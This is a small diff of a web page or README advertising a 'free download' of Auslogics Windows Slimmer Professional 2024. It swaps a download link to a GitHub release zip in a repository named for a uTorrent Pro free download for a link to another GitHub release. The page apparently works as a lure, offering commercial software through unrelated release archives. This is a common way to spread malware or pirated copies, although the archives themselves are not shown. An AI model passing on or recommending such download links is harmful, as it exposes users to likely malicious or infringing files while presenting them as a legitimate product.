@@ -8,5 +8,5 @@
 <h2>Auslogics Free Download</h2>
 <p><strong>Auslogics Windows Slimmer Professional 2024 is a very handy and powerful tool that cleans up your system as well as manage the installed applications. It provides you two different types of maintenance which include one-time and regular.</p>
 </ol>
-<a href="https://github.com/abilbiju/.utorrent-pro-download-for-free/releases/download/UU/ExtraSoft.zip">
+<a href="https://github.com/lavanyadhiman/Auslogics-Windows-Slimmer/releases/tag/DOWNLOAD">
 <img src="https://img.shields.io/badge/Download-blue?logo=Download&logoColor=white&style=for-the-badge" alt="Download"/>
